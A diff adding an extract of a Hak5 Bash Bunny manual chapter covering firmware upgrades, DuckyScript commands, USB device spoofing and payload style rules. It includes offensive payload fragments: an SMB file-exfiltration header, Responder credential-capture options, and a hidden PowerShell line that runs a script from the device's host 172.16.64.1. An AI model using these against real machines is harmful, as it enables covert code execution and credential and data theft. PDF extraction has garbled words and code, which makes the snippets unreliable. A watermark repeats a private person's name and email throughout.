@@ -1,0 +1,373 @@
+# Security Chapter Extract
+Book: Darren Kitchen - Bash Bunny_ A Guide to the HotPlug Attack Platform (2022, Hak5 LLC) - libgen.li
+Chapter: 3 - STEP BY STEP FIRMWARE UPGRADE INSTRUCTIONS
+Security Relevance Score: 4
+Word Count: 2581
+Extracted: 2025-06-13 23:40:20
+
+---
+
+STEP BY STEP FIRMWARE UPGRADE INSTRUCTIONS
+1.Download the latest version of the Bash Bunny firmware from . Do not extract 
+the .tar.gz archive https://downloads.hak5.org
+2.Verify that the SHA256 checksum of the downloaded firmware files matches the checksum listed from 
+the download site
+3.Slide the Bash Bunny switch into Arming Mode (closest to the USB plug) and plug the Bash Bunny into 
+your computer
+4.Copy the firmware upgrade file downloaded in step 1 to the root of the Bash Bunny flash drive.
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+5.Safely eject the Bash Bunny flash drive (IMPORTANT)
+6.With the switch still in Arming Mode, plug the Bash Bunny back into your computer and wait 10 minutes.
+Following version 1.0, all future upgrades and firmware recoveries will be indicated by a special 
+LED “police” pattern, alternating quickly between red and blue.
+MacOS / Safari users: disable automatic unzipping
+LED STATUS FOR UPGRADES FROM 1.0 TO 1.1
+LED Status
+Red Blinking Flashing in progress
+Green Solid Rebooting
+Blue Blinking Flash complete
+ 
+LED STATUS FOR UPGRADES FROM 1.1 ONWARDS
+LED Status
+Red/Blue Alternating Flashing in progress
+Green Solid Rebooting
+Blue Blinking Flash complete
+Writing Payloads
+Payload Development Basics
+Bash Bunny payloads can be written in any standard text editor, such as notepad, vi or nano.
+Payloads must be named payload.txt. When the Bash Bunny boots with its switch in position 1 or 2, 
+the payload.txt file from the corresponding switch folder is executed.
+Payloads can be swapped by copy/paste when the Bash Bunny is in its arming mode (switch position 3 – 
+closest to the USB plug) via Mass Storage.
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+DuckyScript™ on the Bash Bunny
+DuckyS cript™ is the payload language of Hak5 gear. It consisting of a number of simple commands specific 
+to the Bash Bunny hardware, some bunny helper functions and the full power of the Bash Unix shell and 
+command language. Theses payloads, named payload.txt, execute on boot by the Bash Bunny.
+The extensions can be sourced which extend the DuckyS cript language with user contributed functions and 
+variables which enhance and simplify payloads. All DuckyS cript commands are written in ALL CAPS. The 
+base DuckyS cript commands are:
+COMMAND Description
+ATTACKMODESpecifies the USB device or combination of 
+devices to emulate.
+LEDControl the RGB LED. Accepts color and pattern o
+payload state.
+QUACKInjects keystrokes (ducky script) or specified ducky
+script file.
+Q Alias for QUACK
+DUCKY_LANGSet the HID Keyboard language. e.g: 
+DUCKY_LANG us
+Extensions
+Extensions which augment DuckyS cript with new commands and functions. For each payload.txt run, 
+extensions are sourced automatically. Calling the function names of any extension will produce the desired 
+result. Extensions reside in the payload library on the USB mass storage partition from 
+/payloads/library/extensions.
+EXAMPLE EXTENSIONS
+This table is provides a non-exhaustive list of basic usage for some extensions. Additional extension 
+documentation can be found from the comments within each individual extension script file in 
+/payload/library/extensions.
+COMMAND Description Example
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+RUNKeystroke injection shortcut for 
+mutli-OS command execution.RUN WIN notepad.exe
+  RUN OSX terminal
+  RUN UNITY xterm
+GET Exports system variablesGET TARGET_IP # 
+exports $TARGET_IP
+  GET TARGET_HOSTNAME # 
+exports 
+$TARGET_HOSTNAME
+  GET HOST_IP # exports 
+$HOST_IP
+  GET SWITCH_POSITION # 
+exports 
+$SWITCH_POSITION
+REQUIRETOOLExits payload with LED FAIL 
+state if the specified tool is not 
+found in /toolsREQUIRETOOL impacket
+DUCKY_LANGAccepts two letter country code 
+to set the HID injection language 
+for subsequent ducky script / 
+QUACK commandsDUCKY_LANG us
+Extensions replaced bunny_helpers.sh from  onwards. Bash Bunny firmware version 1.1
+Extensions come pre-installed on the Bash Bunny Mark II
+ATTACKMODE
+ATTACKMODE is a DuckyS cript command which specifies which devices to emulate. The ATTACKMODE 
+command may be issued multiple times within a given payload. For example, a payload may begin by 
+emulating Ethernet, then switch to emulating a keyboard and serial later based on a number of conditions.
+ATTACKMODE Description
+SERIALACM – Abstract Control Model 
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+SilC l
+ECM_ETHERNETECM – Ethernet Control Model 
+Linux/Mac/Android Ethernet Adapter
+RNDIS_ETHERNETRNDIS – Remote Network Driver Interface 
+Specification 
+Windows (and some Linux) Ethernet Adapter
+AUTO_ETHERNETAutomatic Ethernet. This attack mode will first 
+attempt to bring up ECM_ETHERNET. If after the 
+default timeout of 20 seconds no connection is 
+established, RNDIS_ETHERNET will be 
+attempted. The timeout may be changed by addin
+ETHERNET_TIMEOUT_XX where XX is the 
+number of seconds, e.g. 
+ETHERNET_TIMEOUT_60 for one minute.
+Requires firmware version 1.5+
+STORAGEUMS – USB Mass Storage 
+Flash Drive
+HIDHID – Human Interface Device 
+Keyboard – Keystroke Injection via Ducky Script 
+Many combinations of attack modes are possible, however some are not. For example, ATTACKMODE HID 
+STORAGE ECM_ETHERNET is valid while ATTACKMODE RNDIS_ETHERNET ECM_ETHERNET 
+STORAGE SERIAL is not. Each attack mode combination registers using a different USB VID/PID (Vendor 
+ID/Product ID) by default. VID and PID can be spoofed using the VID and PID commands.
+ATTACKMODE COMBINATION VID / PID
+SERIAL STORAGE 0xF000/0xFFF0
+HID 0xF000/0xFF01
+STORAGE 0xF000/0xFF10
+SERIAL 0xF000/0xFF11
+RNDIS_ETHERNET 0xF000/0xFF12
+ECM_ETHERNET 0xF000/0xFF13
+HID SERIAL 0xF000/0xFF14
+HID STORAGE 0xF000/0xFF02
+HID RNDIS_ETHERNET 0xF000/0xFF03
+HID ECM_ETHERNET 0xF000/0xFF04
+HID STORAGE RNDIS_ETHERNET 0xF000/0xFF05
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+HID STORAGE ECM_ETHERNET 0xF000/0xFF06
+SERIAL RNDIS_ETHERNET 0xF000/0xFF07
+SERIAL ECM_ETHERNET 0xF000/0xFF08
+STORAGE RNDIS_ETHERNET 0xF000/0xFF20
+STORAGE ECM_ETHERNET 0xF000/0xFF21
+LED
+The multi-color RGB LED status indicator on the Bash Bunny may be set using the LED command. It 
+accepts either a combination of color and pattern, or a common payload state.
+LED COLORS
+COMMAND Description
+R Red
+G Green
+B Blue
+Y Yellow (AKA as Amber)
+C Cyan (AKA Light Blue)
+M Magenta (AKA Violet or Purple)
+W White
+LED PATTERNS
+PATTERN Description
+SOLIDDefault No blink. Used if pattern argument is 
+ommitted
+SLOW Symmetric 1000ms ON, 1000ms OFF, repeating
+FAST Symmetric 100ms ON, 100ms OFF, repeating
+VERYFAST Symmetric 10ms ON, 10ms OFF, repeating
+SINGLE1 100ms blink(s) ON followed by 1 second OFF, 
+repeating
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+DOUBLE2 100ms blink(s) ON followed by 1 second OFF, 
+repeating
+TRIPLE3 100ms blink(s) ON followed by 1 second OFF, 
+repeating
+QUAD4 100ms blink(s) ON followed by 1 second OFF, 
+repeating
+QUIN5 100ms blink(s) ON followed by 1 second OFF, 
+repeating
+ISINGLE1 100ms blink(s) OFF followed by 1 second ON, 
+repeating
+IDOUBLE2 100ms blink(s) OFF followed by 1 second ON, 
+repeating
+ITRIPLE3 100ms blink(s) OFF followed by 1 second ON, 
+repeating
+IQUAD4 100ms blink(s) OFF followed by 1 second ON, 
+repeating
+IQUIN5 100ms blink(s) OFF followed by 1 second ON, 
+repeating
+SUCCESS 1000ms VERYFAST blink followed by SOLID
+1-10000Custom value in ms for continuous symmetric 
+blinking
+LED STATE
+These standardized LED States may be used to indicate common payload status. The basic LED states 
+include SETUP, FAIL, ATTACK, CLEANUP and FINISH. Payload developers are encouraged to use 
+these common payload states. Additional states including multi-staged attack patterns are shown in the 
+table below.
+STATE COLOR PATTERN Description
+SETUP M SOLID Magenta solid
+FAIL R SLOW Red slow blink
+FAIL1 R SLOW Red slow blink
+FAIL2 R FAST Red fast blink
+FAIL3 R VERYFAST Red very fast blink
+ATTACK Y SINGLE Yellow single blink
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+STAGE1 Y SINGLE Yellow single blink
+STAGE2 Y DOUBLE Yellow double blink
+STAGE3 Y TRIPLE Yellow triple blink
+STAGE4 Y QUAD Yellow quadruple blink
+STAGE5 Y QUIN Yellow quintuple blink
+SPECIAL C ISINGLE Cyan inverted single blink
+SPECIAL1 C ISINGLE Cyan inverted single blink
+SPECIAL2 C IDOUBLE Cyan inverted double blink
+SPECIAL3 C ITRIPLE Cyan inverted triple blink
+SPECIAL4 C IQUAD Cyan inverted quadriple blink
+SPECIAL5 C IQUIN Cyan inverted quintuple blink
+CLEANUP W FAST White fast blink
+FINISH G SUCCESSGreen 1000ms VERYFAST 
+blink followed by SOLID
+EXAMPLES
+LED Y SINGLE 1
+LED M 500 1
+LED SETUP 1
+QUACK
+The Bash Bunny inherits the original DuckyS cript commands from the USB Rubber Ducky. Keystrokes can 
+be injected from DuckyS cript text files, or inline using the QUACK command. The ATTACKMODE must 
+contain HID for keystroke injection.
+Examples:
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+QUACK switch1/helloworld.txt 1
+Injects keystrokes from the specified ducky script text file.
+QUACK STRING Hello World 1
+Injects the keystrokes “Hello World”
+Q ALT F4 1
+Injects the keystroke combination of ALT and F4
+ALT CODES
+Firmware version 1.5 added the QUACK ALTCODE command. This allows the printing of alt-codes on 
+Windows system only.
+QUACK ALTCODE 168 # types an upside down question markQUACK ALTCODE 236 # types an infinity 1
+VID, PID, MAN, PROD, SN
+USB devices identify themselves by combinations of vendor ID and product ID. These 16-bit IDs are 
+specified in hex and are used by the target PC to find drivers (if necessary) for the specified device. With the 
+Bash Bunny, the VID and PID may be spoofed using the VID and PID parameters for ATTACKMODE.
+ATTACKMODE HID STORAGE VID_0XF000 PID_0X1234 1
+Similarly, the Manufacturer (32 chr), Product name (32 chr), and Serial number (10 digit) may be specified 
+with MAN_, PROD_, and SN_.
+ATTACKMODE HID STORAGE VID_0XF000 PID_0X1234 MAN_HAK5 PROD_BASHBUNNY SN_1337 1
+Working with the File System
+The Bash Bunny contains a USB Mass Storage partition (also known as udisk) which is typically accessed 
+via Arming Mode. This is the Bash Bunny flash drive to which payloads are copied.
+When the Bash Bunny framework executes a payload, it will synchronize the USB Mass Storage partition 
+file system once the payload completes. This can be either by an exit statement in the payload.txt, or when 
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+theDuckyScriptreachestheendoffile
+Keep this in mind as a payload which writes files to the USB Mass Storage partition within a loop will not 
+have the opportunity to synchronize until the payload completes. This is why ending payloads with an LED 
+FINISH command is advised. In this case, the payload developer is advised to use the sync command to 
+ensure file synchronization is completed.
+Further, the udisk command may be used to manipulate the USB Mass Storage partition, allowing you to 
+mount and unmount the partition as well as reformat the partition. From the Bash Bunny console:
+root@bunny:~# udiskudisk [ mount | unmount | remount | reformat ] 1
+CPU Control
+From firmware version 1.3 onwards, the CPU may be controlled using the CUCUMBER command. By 
+default, CUCUMBER is set to DISABLE - which sets the CPU governor to 'ondemand'. This is a good 
+balance between performance and power draw with all cores scaling as needed.
+To avoid excess heat buildup with payloads which require long term deployments, use CUCUMBER 
+ENABLE to disable all but one CPU core and set the governor to 'ondemand'. This will keep the Bash 
+Bunny cool as a, vegetable of choice.
+To set the Bash Bunny to maximum performance, CUCUMBER may be set to PLAID This enables all cores
+and sets the governor to 'performance'..
+MODE Setting Notes
+CUCUMBER ENABLE Single core 'ondemand'Low power for long term 
+deployments
+CUCUMBER DISABLE Quad core 'ondemand' Default setting
+CUCUMBER PLAID Quad core 'performance' Beyond ludicrous speed 
+Much like ATTACKMODE, the CPU may be controlled dynamically in a given payload. This means that, for 
+example, one stage of an attack may use the lower power CUCUMBER ENABLE setting while another may 
+use the higher power CUCUMBER PLAID setting.
+Contributing Best Practices
+Once you have developed your payload, you are encouraged to contribute to this repository by submitting a 
+Pull Request. Reviewed and Approved pull requests will add your payload to this repository, where they 
+may be publically available.
+Please adhere to the following best practices and style guide when submitting a payload.
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+Naming Conventions
+Please give your payload a unique and descriptive name. Do not use spaces in payload names. Each 
+payload should be submit into its own directory, with - or _ used in place of spaces, to one of the 
+categories such as exfiltration, phishing, remote_access or recon. Do not create your own category.
+Binaries
+Binaries may not be accepted in this repository. If a binary is used in conjunction with the payload, please 
+document where it or its source may be obtained.
+Comments
+Payloads should begin with comments specifying at the very least the name of the payload and author. 
+Additional information such as a brief description, the target, any dependencies / prerequisites and the LED 
+status used is helpful.
+Title: SMB Exfiltrator 1
+Description: Exfiltrates files from %userprofile%\documents via SMB 2
+Author: Hak5Darren 3
+Target: Windows XP SP3 - Latest 4
+Dependencies: impacket 5
+Configuration Options
+Configurable options should be specified in variables at the top of the payload.txt file
+# Options 1
+RESPONDER_OPTIONS="-w -r -d -P" 2
+LOOTDIR=/root/udisk/loot/quickcreds 3
+LED
+The payload should use common payload states rather than unique color/pattern combinations when 
+possible with an LED command preceding the Stage or ATTACKMODE.
+# Initialization 1
+LED SETUP 2
+GET SWITCH_POSITION 3
+GET HOST_IP 4
+5
+# Attack 6
+LED ATTACK 7
+ATTACKMODE HID ECM_ETHERNET 8
+Stages and States
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+Stages should be documented with comments
+# Keystroke Injection Stage 1
+# Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available 2
+GET HOST_IP 3
+LED STAGE1 4
+ATTACKMODE HID 5
+RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection 6
+Common payload states include a SETUP, with may include a FAIL if certain conditions are not met. This 
+is typically followed by either a single ATTACK or multiple STAGEs. More complex payloads may include 
+a SPECIAL function to wait until certain conditions are met. Payloads commonly end with a CLEANUP 
+phase, such as moving and deleting files or stopping services. A payload may FINISH when the objective 
+is complete and the device is safe to eject or turn off. These common payload states correspond to LED 
+states.
+Submitting Payloads
+Payloads may be submitted to the . For a video tutorial on submitting 
+payloads, see .Bash Bunny Payload git repository
+Hak5 episode 2126
+Notable payloads are featured on the Hak5 PayloadHub at payloads.hak5.org
+There you may find additional resources to quickly and easily contribute payloads to the community 
+repositories.
+WAIT_FOR_PRESENT
+With the Bash Bunny Mark II, payload stages may be triggered using the WAIT_FOR_PRESENT and 
+WAIT_FOR_NOT_PRESENT extensions.
+Geofencing may be achieved by profiling the bluetooth wireless environment of the target. Multiple 
+WAIT_FOR_PRESENT commands may be "stacked" one after another.
+WAIT_FOR_PRESENT
+# Pauses payload execution until specified bluetooth identifier IS present# Usage: WAIT_FOR 1
+Example
+Hailey King - haileykq1w2e3r417@gmail.com - November 10, 2024
+
+# Stage 1: Enumerate as mass storage with silent HID device 1ATTACKMODE HID STORAGE 2
+WAIT_FOR_PRESENT my-bluetooth-device-name 3
+4
+# Stage 2: Type Hello World into Notepad 5
+WIN RUN notepad.exe 6
+QUACK DELAY 1000 7
+QUACK STRING Hello World 8
+WAIT_FOR_NOT_PRESENT
+# Pauses payload execution until specified bluetooth identifier IS NOT present 1
+# Usage: WAIT_FOR_NOTPRESENT devicename 2
+Troubleshooting
+Factory Reset
+In the extreme case that the Bash Bunny has become permanently inaccessible or inoperative, there is a 
+quick method for recovery using a special boot pattern.
+1.Set the switch to arming mode (closest to the USB port)
+2.Plug the Bash Bunny into a USB port and unplug it immediately after the green LED turns off
+3.Repeat step #2 three times
+4.Plug the Bash Bunny into a USB port and wait approximately 5 minutes for it to reset. The LED will 
+either show an alternating red/blue "police" pattern or blink red.
+5.When the firmware recovery has completed, the Bash Bunny will reboot, indicated by the green LED, 
+then go into arming mode, indicated by the blue LED.
+This process will restore the Bash Bunny to the original factory firmware version 1.
